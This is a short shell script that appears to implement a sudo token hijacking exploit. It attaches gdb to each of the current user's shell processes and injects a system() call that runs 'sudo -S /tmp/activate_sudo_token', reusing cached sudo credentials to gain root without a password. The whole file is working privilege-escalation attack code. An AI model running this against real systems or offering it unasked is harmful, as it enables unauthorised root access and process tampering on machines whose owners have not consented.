#!/bin/sh

# create an invalid sudo entry
echo | sudo -S >/dev/null 2>&1
cp activate_sudo_token /tmp/
timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')
# inject all shell belonging to the current user, our shell one :p
for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")
do
	echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")
	echo 'call system("echo | sudo -S /tmp/activate_sudo_token >/dev/null 2>&1")' \
		| gdb -q -p "$pid" >/dev/null 2>&1
done
